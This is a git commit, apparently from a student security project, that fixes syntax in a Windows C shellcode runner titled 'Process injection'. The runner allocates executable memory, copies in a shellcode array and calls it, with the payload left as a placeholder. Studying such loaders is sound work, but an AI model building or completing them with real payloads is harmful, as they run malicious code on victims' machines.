826688e1fdcc8c759c8c480ba5af139066369639
geoffrey-diederichs <geoffrey.diederichs@ynov.com>
2023-05-25 02:12:33 +0200

    Process injection

--- Process_injection/Source_code/process_inj.c
+++ Process_injection/Source_code/process_inj.c
@@ -2,14 +2,14 @@
 #include <windows.h>
 #include <string.h>
 
-unsigned char shellcode[] = <SHELLCODE_TO_REPLACE>
-int shellcode_size = sizeof(shellcode)
+unsigned char shellcode[] = <SHELLCODE_TO_REPLACE>;
+int shellcode_size = sizeof(shellcode);
 
 int main()
 {
 	void *exec = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, shellcode, shellcode_size);
-	((void(*))exec);
+	((void(*)())exec)();
 
-	return 0
+	return 0;
 }
